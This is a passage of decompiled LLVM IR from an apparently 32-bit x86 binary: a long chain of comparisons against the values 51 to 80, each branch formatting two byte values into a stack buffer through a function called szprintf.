  store i32 %v1_804a9a2, i32* @edx, align 4
  %v0_804a9ac = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a9ac = zext i8 %v0_804a9ac to i32
  %v2_804a9bb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9bb, i32* @ebx, align 4
  %v4_804a9cd = call i32 @szprintf(i32 %v2_804a9bb, i32 ptrtoint ([12 x i8]* @global_var_8057bb3.90 to i32), i32 %v1_804a9ac)
  br label %dec_label_pc_804a9d2

dec_label_pc_804a9d2:                             ; preds = %dec_label_pc_804a99c, %dec_label_pc_804a9a2
  %v13_804a9d2 = icmp eq i32 %v2_8049efa, 51
  %v1_804a9d6 = icmp eq i1 %v13_804a9d2, false
  br i1 %v1_804a9d6, label %dec_label_pc_804aa08, label %dec_label_pc_804a9d8

dec_label_pc_804a9d8:                             ; preds = %dec_label_pc_804a9d2
  %v0_804a9d8 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a9d8 = zext i8 %v0_804a9d8 to i32
  store i32 %v1_804a9d8, i32* @edx, align 4
  %v0_804a9e2 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a9e2 = zext i8 %v0_804a9e2 to i32
  %v2_804a9f1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9f1, i32* @ebx, align 4
  %v4_804aa03 = call i32 @szprintf(i32 %v2_804a9f1, i32 ptrtoint ([13 x i8]* @global_var_8057bbf.91 to i32), i32 %v1_804a9e2)
  br label %dec_label_pc_804aa08

dec_label_pc_804aa08:                             ; preds = %dec_label_pc_804a9d2, %dec_label_pc_804a9d8
  %v13_804aa08 = icmp eq i32 %v2_8049efa, 52
  %v1_804aa0c = icmp eq i1 %v13_804aa08, false
  br i1 %v1_804aa0c, label %dec_label_pc_804aa3e, label %dec_label_pc_804aa0e

dec_label_pc_804aa0e:                             ; preds = %dec_label_pc_804aa08
  %v0_804aa0e = load i8, i8* @global_var_806259a.41, align 2
  %v1_804aa0e = zext i8 %v0_804aa0e to i32
  store i32 %v1_804aa0e, i32* @edx, align 4
  %v0_804aa18 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804aa18 = zext i8 %v0_804aa18 to i32
  %v2_804aa27 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa27, i32* @ebx, align 4
  %v4_804aa39 = call i32 @szprintf(i32 %v2_804aa27, i32 ptrtoint ([13 x i8]* @global_var_8057bcc.92 to i32), i32 %v1_804aa18)
  br label %dec_label_pc_804aa3e

dec_label_pc_804aa3e:                             ; preds = %dec_label_pc_804aa08, %dec_label_pc_804aa0e
  %v13_804aa3e = icmp eq i32 %v2_8049efa, 53
  %v1_804aa42 = icmp eq i1 %v13_804aa3e, false
  br i1 %v1_804aa42, label %dec_label_pc_804aa74, label %dec_label_pc_804aa44

dec_label_pc_804aa44:                             ; preds = %dec_label_pc_804aa3e
  %v0_804aa44 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804aa44 = zext i8 %v0_804aa44 to i32
  store i32 %v1_804aa44, i32* @edx, align 4
  %v0_804aa4e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804aa4e = zext i8 %v0_804aa4e to i32
  %v2_804aa5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa5d, i32* @ebx, align 4
  %v4_804aa6f = call i32 @szprintf(i32 %v2_804aa5d, i32 ptrtoint ([14 x i8]* @global_var_8057bd9.93 to i32), i32 %v1_804aa4e)
  br label %dec_label_pc_804aa74

dec_label_pc_804aa74:                             ; preds = %dec_label_pc_804aa3e, %dec_label_pc_804aa44
  %v13_804aa74 = icmp eq i32 %v2_8049efa, 54
  %v1_804aa78 = icmp eq i1 %v13_804aa74, false
  br i1 %v1_804aa78, label %dec_label_pc_804aaaa, label %dec_label_pc_804aa7a

dec_label_pc_804aa7a:                             ; preds = %dec_label_pc_804aa74
  %v0_804aa7a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804aa7a = zext i8 %v0_804aa7a to i32
  store i32 %v1_804aa7a, i32* @edx, align 4
  %v0_804aa84 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804aa84 = zext i8 %v0_804aa84 to i32
  %v2_804aa93 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa93, i32* @ebx, align 4
  %v4_804aaa5 = call i32 @szprintf(i32 %v2_804aa93, i32 ptrtoint ([13 x i8]* @global_var_8057be7.94 to i32), i32 %v1_804aa84)
  br label %dec_label_pc_804aaaa

dec_label_pc_804aaaa:                             ; preds = %dec_label_pc_804aa74, %dec_label_pc_804aa7a
  %v13_804aaaa = icmp eq i32 %v2_8049efa, 55
  %v1_804aaae = icmp eq i1 %v13_804aaaa, false
  br i1 %v1_804aaae, label %dec_label_pc_804aae0, label %dec_label_pc_804aab0

dec_label_pc_804aab0:                             ; preds = %dec_label_pc_804aaaa
  %v0_804aab0 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804aab0 = zext i8 %v0_804aab0 to i32
  store i32 %v1_804aab0, i32* @edx, align 4
  %v0_804aaba = load i8, i8* @global_var_8062599.40, align 1
  %v1_804aaba = zext i8 %v0_804aaba to i32
  %v2_804aac9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aac9, i32* @ebx, align 4
  %v4_804aadb = call i32 @szprintf(i32 %v2_804aac9, i32 ptrtoint ([14 x i8]* @global_var_8057bf4.95 to i32), i32 %v1_804aaba)
  br label %dec_label_pc_804aae0

dec_label_pc_804aae0:                             ; preds = %dec_label_pc_804aaaa, %dec_label_pc_804aab0
  %v13_804aae0 = icmp eq i32 %v2_8049efa, 56
  %v1_804aae4 = icmp eq i1 %v13_804aae0, false
  br i1 %v1_804aae4, label %dec_label_pc_804ab16, label %dec_label_pc_804aae6

dec_label_pc_804aae6:                             ; preds = %dec_label_pc_804aae0
  %v0_804aae6 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804aae6 = zext i8 %v0_804aae6 to i32
  store i32 %v1_804aae6, i32* @edx, align 4
  %v0_804aaf0 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804aaf0 = zext i8 %v0_804aaf0 to i32
  %v2_804aaff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaff, i32* @ebx, align 4
  %v4_804ab11 = call i32 @szprintf(i32 %v2_804aaff, i32 ptrtoint ([14 x i8]* @global_var_8057c02.96 to i32), i32 %v1_804aaf0)
  br label %dec_label_pc_804ab16

dec_label_pc_804ab16:                             ; preds = %dec_label_pc_804aae0, %dec_label_pc_804aae6
  %v13_804ab16 = icmp eq i32 %v2_8049efa, 57
  %v1_804ab1a = icmp eq i1 %v13_804ab16, false
  br i1 %v1_804ab1a, label %dec_label_pc_804ab4c, label %dec_label_pc_804ab1c

dec_label_pc_804ab1c:                             ; preds = %dec_label_pc_804ab16
  %v0_804ab1c = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ab1c = zext i8 %v0_804ab1c to i32
  store i32 %v1_804ab1c, i32* @edx, align 4
  %v0_804ab26 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ab26 = zext i8 %v0_804ab26 to i32
  %v2_804ab35 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab35, i32* @ebx, align 4
  %v4_804ab47 = call i32 @szprintf(i32 %v2_804ab35, i32 ptrtoint ([13 x i8]* @global_var_8057c10.97 to i32), i32 %v1_804ab26)
  br label %dec_label_pc_804ab4c

dec_label_pc_804ab4c:                             ; preds = %dec_label_pc_804ab16, %dec_label_pc_804ab1c
  %v13_804ab4c = icmp eq i32 %v2_8049efa, 58
  %v1_804ab50 = icmp eq i1 %v13_804ab4c, false
  br i1 %v1_804ab50, label %dec_label_pc_804ab82, label %dec_label_pc_804ab52

dec_label_pc_804ab52:                             ; preds = %dec_label_pc_804ab4c
  %v0_804ab52 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ab52 = zext i8 %v0_804ab52 to i32
  store i32 %v1_804ab52, i32* @edx, align 4
  %v0_804ab5c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ab5c = zext i8 %v0_804ab5c to i32
  %v2_804ab6b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab6b, i32* @ebx, align 4
  %v4_804ab7d = call i32 @szprintf(i32 %v2_804ab6b, i32 ptrtoint ([13 x i8]* @global_var_8057c1d.98 to i32), i32 %v1_804ab5c)
  br label %dec_label_pc_804ab82

dec_label_pc_804ab82:                             ; preds = %dec_label_pc_804ab4c, %dec_label_pc_804ab52
  %v13_804ab82 = icmp eq i32 %v2_8049efa, 59
  %v1_804ab86 = icmp eq i1 %v13_804ab82, false
  br i1 %v1_804ab86, label %dec_label_pc_804abb8, label %dec_label_pc_804ab88

dec_label_pc_804ab88:                             ; preds = %dec_label_pc_804ab82
  %v0_804ab88 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ab88 = zext i8 %v0_804ab88 to i32
  store i32 %v1_804ab88, i32* @edx, align 4
  %v0_804ab92 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ab92 = zext i8 %v0_804ab92 to i32
  %v2_804aba1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aba1, i32* @ebx, align 4
  %v4_804abb3 = call i32 @szprintf(i32 %v2_804aba1, i32 ptrtoint ([13 x i8]* @global_var_8057c2a.99 to i32), i32 %v1_804ab92)
  br label %dec_label_pc_804abb8

dec_label_pc_804abb8:                             ; preds = %dec_label_pc_804ab82, %dec_label_pc_804ab88
  %v13_804abb8 = icmp eq i32 %v2_8049efa, 60
  %v1_804abbc = icmp eq i1 %v13_804abb8, false
  br i1 %v1_804abbc, label %dec_label_pc_804abee, label %dec_label_pc_804abbe

dec_label_pc_804abbe:                             ; preds = %dec_label_pc_804abb8
  %v0_804abbe = load i8, i8* @global_var_806259a.41, align 2
  %v1_804abbe = zext i8 %v0_804abbe to i32
  store i32 %v1_804abbe, i32* @edx, align 4
  %v0_804abc8 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804abc8 = zext i8 %v0_804abc8 to i32
  %v2_804abd7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abd7, i32* @ebx, align 4
  %v4_804abe9 = call i32 @szprintf(i32 %v2_804abd7, i32 ptrtoint ([13 x i8]* @global_var_8057c37.100 to i32), i32 %v1_804abc8)
  br label %dec_label_pc_804abee

dec_label_pc_804abee:                             ; preds = %dec_label_pc_804abb8, %dec_label_pc_804abbe
  %v13_804abee = icmp eq i32 %v2_8049efa, 61
  %v1_804abf2 = icmp eq i1 %v13_804abee, false
  br i1 %v1_804abf2, label %dec_label_pc_804ac24, label %dec_label_pc_804abf4

dec_label_pc_804abf4:                             ; preds = %dec_label_pc_804abee
  %v0_804abf4 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804abf4 = zext i8 %v0_804abf4 to i32
  store i32 %v1_804abf4, i32* @edx, align 4
  %v0_804abfe = load i8, i8* @global_var_8062599.40, align 1
  %v1_804abfe = zext i8 %v0_804abfe to i32
  %v2_804ac0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac0d, i32* @ebx, align 4
  %v4_804ac1f = call i32 @szprintf(i32 %v2_804ac0d, i32 ptrtoint ([13 x i8]* @global_var_8057c44.101 to i32), i32 %v1_804abfe)
  br label %dec_label_pc_804ac24

dec_label_pc_804ac24:                             ; preds = %dec_label_pc_804abee, %dec_label_pc_804abf4
  %v13_804ac24 = icmp eq i32 %v2_8049efa, 62
  %v1_804ac28 = icmp eq i1 %v13_804ac24, false
  br i1 %v1_804ac28, label %dec_label_pc_804ac5a, label %dec_label_pc_804ac2a

dec_label_pc_804ac2a:                             ; preds = %dec_label_pc_804ac24
  %v0_804ac2a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ac2a = zext i8 %v0_804ac2a to i32
  store i32 %v1_804ac2a, i32* @edx, align 4
  %v0_804ac34 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ac34 = zext i8 %v0_804ac34 to i32
  %v2_804ac43 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac43, i32* @ebx, align 4
  %v4_804ac55 = call i32 @szprintf(i32 %v2_804ac43, i32 ptrtoint ([13 x i8]* @global_var_8057c51.102 to i32), i32 %v1_804ac34)
  br label %dec_label_pc_804ac5a

dec_label_pc_804ac5a:                             ; preds = %dec_label_pc_804ac24, %dec_label_pc_804ac2a
  %v13_804ac5a = icmp eq i32 %v2_8049efa, 63
  %v1_804ac5e = icmp eq i1 %v13_804ac5a, false
  br i1 %v1_804ac5e, label %dec_label_pc_804ac90, label %dec_label_pc_804ac60

dec_label_pc_804ac60:                             ; preds = %dec_label_pc_804ac5a
  %v0_804ac60 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ac60 = zext i8 %v0_804ac60 to i32
  store i32 %v1_804ac60, i32* @edx, align 4
  %v0_804ac6a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ac6a = zext i8 %v0_804ac6a to i32
  %v2_804ac79 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac79, i32* @ebx, align 4
  %v4_804ac8b = call i32 @szprintf(i32 %v2_804ac79, i32 ptrtoint ([13 x i8]* @global_var_8057c5e.103 to i32), i32 %v1_804ac6a)
  br label %dec_label_pc_804ac90

dec_label_pc_804ac90:                             ; preds = %dec_label_pc_804ac5a, %dec_label_pc_804ac60
  %v10_804ac90 = icmp eq i32 %v2_8049efa, 64
  %v1_804ac94 = icmp eq i1 %v10_804ac90, false
  br i1 %v1_804ac94, label %dec_label_pc_804acc6, label %dec_label_pc_804ac96

dec_label_pc_804ac96:                             ; preds = %dec_label_pc_804ac90
  %v0_804ac96 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ac96 = zext i8 %v0_804ac96 to i32
  store i32 %v1_804ac96, i32* @edx, align 4
  %v0_804aca0 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804aca0 = zext i8 %v0_804aca0 to i32
  %v2_804acaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acaf, i32* @ebx, align 4
  %v4_804acc1 = call i32 @szprintf(i32 %v2_804acaf, i32 ptrtoint ([13 x i8]* @global_var_8057c6b.104 to i32), i32 %v1_804aca0)
  br label %dec_label_pc_804acc6

dec_label_pc_804acc6:                             ; preds = %dec_label_pc_804ac90, %dec_label_pc_804ac96
  %v13_804acc6 = icmp eq i32 %v2_8049efa, 65
  %v1_804acca = icmp eq i1 %v13_804acc6, false
  br i1 %v1_804acca, label %dec_label_pc_804acfc, label %dec_label_pc_804accc

dec_label_pc_804accc:                             ; preds = %dec_label_pc_804acc6
  %v0_804accc = load i8, i8* @global_var_806259a.41, align 2
  %v1_804accc = zext i8 %v0_804accc to i32
  store i32 %v1_804accc, i32* @edx, align 4
  %v0_804acd6 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804acd6 = zext i8 %v0_804acd6 to i32
  %v2_804ace5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ace5, i32* @ebx, align 4
  %v4_804acf7 = call i32 @szprintf(i32 %v2_804ace5, i32 ptrtoint ([13 x i8]* @global_var_8057c78.105 to i32), i32 %v1_804acd6)
  br label %dec_label_pc_804acfc

dec_label_pc_804acfc:                             ; preds = %dec_label_pc_804acc6, %dec_label_pc_804accc
  %v13_804acfc = icmp eq i32 %v2_8049efa, 66
  %v1_804ad00 = icmp eq i1 %v13_804acfc, false
  br i1 %v1_804ad00, label %dec_label_pc_804ad32, label %dec_label_pc_804ad02

dec_label_pc_804ad02:                             ; preds = %dec_label_pc_804acfc
  %v0_804ad02 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ad02 = zext i8 %v0_804ad02 to i32
  store i32 %v1_804ad02, i32* @edx, align 4
  %v0_804ad0c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ad0c = zext i8 %v0_804ad0c to i32
  %v2_804ad1b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad1b, i32* @ebx, align 4
  %v4_804ad2d = call i32 @szprintf(i32 %v2_804ad1b, i32 ptrtoint ([13 x i8]* @global_var_8057c85.106 to i32), i32 %v1_804ad0c)
  br label %dec_label_pc_804ad32

dec_label_pc_804ad32:                             ; preds = %dec_label_pc_804acfc, %dec_label_pc_804ad02
  %v13_804ad32 = icmp eq i32 %v2_8049efa, 67
  %v1_804ad36 = icmp eq i1 %v13_804ad32, false
  br i1 %v1_804ad36, label %dec_label_pc_804ad68, label %dec_label_pc_804ad38

dec_label_pc_804ad38:                             ; preds = %dec_label_pc_804ad32
  %v0_804ad38 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ad38 = zext i8 %v0_804ad38 to i32
  store i32 %v1_804ad38, i32* @edx, align 4
  %v0_804ad42 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ad42 = zext i8 %v0_804ad42 to i32
  %v2_804ad51 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad51, i32* @ebx, align 4
  %v4_804ad63 = call i32 @szprintf(i32 %v2_804ad51, i32 ptrtoint ([13 x i8]* @global_var_8057c92.107 to i32), i32 %v1_804ad42)
  br label %dec_label_pc_804ad68

dec_label_pc_804ad68:                             ; preds = %dec_label_pc_804ad32, %dec_label_pc_804ad38
  %v13_804ad68 = icmp eq i32 %v2_8049efa, 68
  %v1_804ad6c = icmp eq i1 %v13_804ad68, false
  br i1 %v1_804ad6c, label %dec_label_pc_804ad9e, label %dec_label_pc_804ad6e

dec_label_pc_804ad6e:                             ; preds = %dec_label_pc_804ad68
  %v0_804ad6e = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ad6e = zext i8 %v0_804ad6e to i32
  store i32 %v1_804ad6e, i32* @edx, align 4
  %v0_804ad78 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ad78 = zext i8 %v0_804ad78 to i32
  %v2_804ad87 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad87, i32* @ebx, align 4
  %v4_804ad99 = call i32 @szprintf(i32 %v2_804ad87, i32 ptrtoint ([13 x i8]* @global_var_8057c9f.108 to i32), i32 %v1_804ad78)
  br label %dec_label_pc_804ad9e

dec_label_pc_804ad9e:                             ; preds = %dec_label_pc_804ad68, %dec_label_pc_804ad6e
  %v13_804ad9e = icmp eq i32 %v2_8049efa, 69
  %v1_804ada2 = icmp eq i1 %v13_804ad9e, false
  br i1 %v1_804ada2, label %dec_label_pc_804add4, label %dec_label_pc_804ada4

dec_label_pc_804ada4:                             ; preds = %dec_label_pc_804ad9e
  %v0_804ada4 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ada4 = zext i8 %v0_804ada4 to i32
  store i32 %v1_804ada4, i32* @edx, align 4
  %v0_804adae = load i8, i8* @global_var_8062599.40, align 1
  %v1_804adae = zext i8 %v0_804adae to i32
  %v2_804adbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adbd, i32* @ebx, align 4
  %v4_804adcf = call i32 @szprintf(i32 %v2_804adbd, i32 ptrtoint ([13 x i8]* @global_var_8057cac.109 to i32), i32 %v1_804adae)
  br label %dec_label_pc_804add4

dec_label_pc_804add4:                             ; preds = %dec_label_pc_804ad9e, %dec_label_pc_804ada4
  %v13_804add4 = icmp eq i32 %v2_8049efa, 70
  %v1_804add8 = icmp eq i1 %v13_804add4, false
  br i1 %v1_804add8, label %dec_label_pc_804ae0a, label %dec_label_pc_804adda

dec_label_pc_804adda:                             ; preds = %dec_label_pc_804add4
  %v0_804adda = load i8, i8* @global_var_806259a.41, align 2
  %v1_804adda = zext i8 %v0_804adda to i32
  store i32 %v1_804adda, i32* @edx, align 4
  %v0_804ade4 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ade4 = zext i8 %v0_804ade4 to i32
  %v2_804adf3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adf3, i32* @ebx, align 4
  %v4_804ae05 = call i32 @szprintf(i32 %v2_804adf3, i32 ptrtoint ([13 x i8]* @global_var_8057cb9.110 to i32), i32 %v1_804ade4)
  br label %dec_label_pc_804ae0a

dec_label_pc_804ae0a:                             ; preds = %dec_label_pc_804add4, %dec_label_pc_804adda
  %v13_804ae0a = icmp eq i32 %v2_8049efa, 71
  %v1_804ae0e = icmp eq i1 %v13_804ae0a, false
  br i1 %v1_804ae0e, label %dec_label_pc_804ae40, label %dec_label_pc_804ae10

dec_label_pc_804ae10:                             ; preds = %dec_label_pc_804ae0a
  %v0_804ae10 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ae10 = zext i8 %v0_804ae10 to i32
  store i32 %v1_804ae10, i32* @edx, align 4
  %v0_804ae1a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ae1a = zext i8 %v0_804ae1a to i32
  %v2_804ae29 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae29, i32* @ebx, align 4
  %v4_804ae3b = call i32 @szprintf(i32 %v2_804ae29, i32 ptrtoint ([13 x i8]* @global_var_8057cc6.111 to i32), i32 %v1_804ae1a)
  br label %dec_label_pc_804ae40

dec_label_pc_804ae40:                             ; preds = %dec_label_pc_804ae0a, %dec_label_pc_804ae10
  %v13_804ae40 = icmp eq i32 %v2_8049efa, 72
  %v1_804ae44 = icmp eq i1 %v13_804ae40, false
  br i1 %v1_804ae44, label %dec_label_pc_804ae76, label %dec_label_pc_804ae46

dec_label_pc_804ae46:                             ; preds = %dec_label_pc_804ae40
  %v0_804ae46 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ae46 = zext i8 %v0_804ae46 to i32
  store i32 %v1_804ae46, i32* @edx, align 4
  %v0_804ae50 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ae50 = zext i8 %v0_804ae50 to i32
  %v2_804ae5f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae5f, i32* @ebx, align 4
  %v4_804ae71 = call i32 @szprintf(i32 %v2_804ae5f, i32 ptrtoint ([13 x i8]* @global_var_8057cd3.112 to i32), i32 %v1_804ae50)
  br label %dec_label_pc_804ae76

dec_label_pc_804ae76:                             ; preds = %dec_label_pc_804ae40, %dec_label_pc_804ae46
  %v13_804ae76 = icmp eq i32 %v2_8049efa, 73
  %v1_804ae7a = icmp eq i1 %v13_804ae76, false
  br i1 %v1_804ae7a, label %dec_label_pc_804aeac, label %dec_label_pc_804ae7c

dec_label_pc_804ae7c:                             ; preds = %dec_label_pc_804ae76
  %v0_804ae7c = load i8, i8* @global_var_806259a.41, align 2
  %v1_804ae7c = zext i8 %v0_804ae7c to i32
  store i32 %v1_804ae7c, i32* @edx, align 4
  %v0_804ae86 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804ae86 = zext i8 %v0_804ae86 to i32
  %v2_804ae95 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae95, i32* @ebx, align 4
  %v4_804aea7 = call i32 @szprintf(i32 %v2_804ae95, i32 ptrtoint ([13 x i8]* @global_var_8057ce0.113 to i32), i32 %v1_804ae86)
  br label %dec_label_pc_804aeac

dec_label_pc_804aeac:                             ; preds = %dec_label_pc_804ae76, %dec_label_pc_804ae7c
  %v13_804aeac = icmp eq i32 %v2_8049efa, 74
  %v1_804aeb0 = icmp eq i1 %v13_804aeac, false
  br i1 %v1_804aeb0, label %dec_label_pc_804aee2, label %dec_label_pc_804aeb2

dec_label_pc_804aeb2:                             ; preds = %dec_label_pc_804aeac
  %v0_804aeb2 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804aeb2 = zext i8 %v0_804aeb2 to i32
  store i32 %v1_804aeb2, i32* @edx, align 4
  %v0_804aebc = load i8, i8* @global_var_8062599.40, align 1
  %v1_804aebc = zext i8 %v0_804aebc to i32
  %v2_804aecb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aecb, i32* @ebx, align 4
  %v4_804aedd = call i32 @szprintf(i32 %v2_804aecb, i32 ptrtoint ([13 x i8]* @global_var_8057ced.114 to i32), i32 %v1_804aebc)
  br label %dec_label_pc_804aee2

dec_label_pc_804aee2:                             ; preds = %dec_label_pc_804aeac, %dec_label_pc_804aeb2
  %v13_804aee2 = icmp eq i32 %v2_8049efa, 75
  %v1_804aee6 = icmp eq i1 %v13_804aee2, false
  br i1 %v1_804aee6, label %dec_label_pc_804af18, label %dec_label_pc_804aee8

dec_label_pc_804aee8:                             ; preds = %dec_label_pc_804aee2
  %v0_804aee8 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804aee8 = zext i8 %v0_804aee8 to i32
  store i32 %v1_804aee8, i32* @edx, align 4
  %v0_804aef2 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804aef2 = zext i8 %v0_804aef2 to i32
  %v2_804af01 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af01, i32* @ebx, align 4
  %v4_804af13 = call i32 @szprintf(i32 %v2_804af01, i32 ptrtoint ([13 x i8]* @global_var_8057cfa.115 to i32), i32 %v1_804aef2)
  br label %dec_label_pc_804af18

dec_label_pc_804af18:                             ; preds = %dec_label_pc_804aee2, %dec_label_pc_804aee8
  %v13_804af18 = icmp eq i32 %v2_8049efa, 76
  %v1_804af1c = icmp eq i1 %v13_804af18, false
  br i1 %v1_804af1c, label %dec_label_pc_804af4e, label %dec_label_pc_804af1e

dec_label_pc_804af1e:                             ; preds = %dec_label_pc_804af18
  %v0_804af1e = load i8, i8* @global_var_806259a.41, align 2
  %v1_804af1e = zext i8 %v0_804af1e to i32
  store i32 %v1_804af1e, i32* @edx, align 4
  %v0_804af28 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804af28 = zext i8 %v0_804af28 to i32
  %v2_804af37 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af37, i32* @ebx, align 4
  %v4_804af49 = call i32 @szprintf(i32 %v2_804af37, i32 ptrtoint ([13 x i8]* @global_var_8057d07.116 to i32), i32 %v1_804af28)
  br label %dec_label_pc_804af4e

dec_label_pc_804af4e:                             ; preds = %dec_label_pc_804af18, %dec_label_pc_804af1e
  %v13_804af4e = icmp eq i32 %v2_8049efa, 77
  %v1_804af52 = icmp eq i1 %v13_804af4e, false
  br i1 %v1_804af52, label %dec_label_pc_804af84, label %dec_label_pc_804af54

dec_label_pc_804af54:                             ; preds = %dec_label_pc_804af4e
  %v0_804af54 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804af54 = zext i8 %v0_804af54 to i32
  store i32 %v1_804af54, i32* @edx, align 4
  %v0_804af5e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804af5e = zext i8 %v0_804af5e to i32
  %v2_804af6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af6d, i32* @ebx, align 4
  %v4_804af7f = call i32 @szprintf(i32 %v2_804af6d, i32 ptrtoint ([13 x i8]* @global_var_8057d14.117 to i32), i32 %v1_804af5e)
  br label %dec_label_pc_804af84

dec_label_pc_804af84:                             ; preds = %dec_label_pc_804af4e, %dec_label_pc_804af54
  %v13_804af84 = icmp eq i32 %v2_8049efa, 78
  %v1_804af88 = icmp eq i1 %v13_804af84, false
  br i1 %v1_804af88, label %dec_label_pc_804afba, label %dec_label_pc_804af8a

dec_label_pc_804af8a:                             ; preds = %dec_label_pc_804af84
  %v0_804af8a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804af8a = zext i8 %v0_804af8a to i32
  store i32 %v1_804af8a, i32* @edx, align 4
  %v0_804af94 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804af94 = zext i8 %v0_804af94 to i32
  %v2_804afa3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afa3, i32* @ebx, align 4
  %v4_804afb5 = call i32 @szprintf(i32 %v2_804afa3, i32 ptrtoint ([13 x i8]* @global_var_8057d21.118 to i32), i32 %v1_804af94)
  br label %dec_label_pc_804afba

dec_label_pc_804afba:                             ; preds = %dec_label_pc_804af84, %dec_label_pc_804af8a
  %v13_804afba = icmp eq i32 %v2_8049efa, 79
  %v1_804afbe = icmp eq i1 %v13_804afba, false
  br i1 %v1_804afbe, label %dec_label_pc_804aff0, label %dec_label_pc_804afc0

dec_label_pc_804afc0:                             ; preds = %dec_label_pc_804afba
  %v0_804afc0 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804afc0 = zext i8 %v0_804afc0 to i32
  store i32 %v1_804afc0, i32* @edx, align 4
  %v0_804afca = load i8, i8* @global_var_8062599.40, align 1
  %v1_804afca = zext i8 %v0_804afca to i32
  %v2_804afd9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afd9, i32* @ebx, align 4
  %v4_804afeb = call i32 @szprintf(i32 %v2_804afd9, i32 ptrtoint ([13 x i8]* @global_var_8057d2e.119 to i32), i32 %v1_804afca)
  br label %dec_label_pc_804aff0

dec_label_pc_804aff0:                             ; preds = %dec_label_pc_804afba, %dec_label_pc_804afc0
  %v10_804aff0 = icmp eq i32 %v2_8049efa, 80
  %v1_804aff4 = icmp eq i1 %v10_804aff0, false
  br i1 %v1_804aff4, label %dec_label_pc_804b026, label %dec_label_pc_804aff6

dec_label_pc_804aff6:                             ; preds = %dec_label_pc_804aff0
  %v0_804aff6 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804aff6 = zext i8 %v0_804aff6 to i32
  store i32 %v1_804aff6, i32* @edx, align 4
  %v0_804b000 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b000 = zext i8 %v0_804b000 to i32
  %v2_804b00f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b00f, i32* @ebx, align 4
  %v4_804b021 = call i32 @szprintf(i32 %v2_804b00f, i32 ptrtoint ([13 x i8]* @global_var_8057d3b.120 to i32), i32 %v1_804b000)
  br label %dec_label_pc_804b026

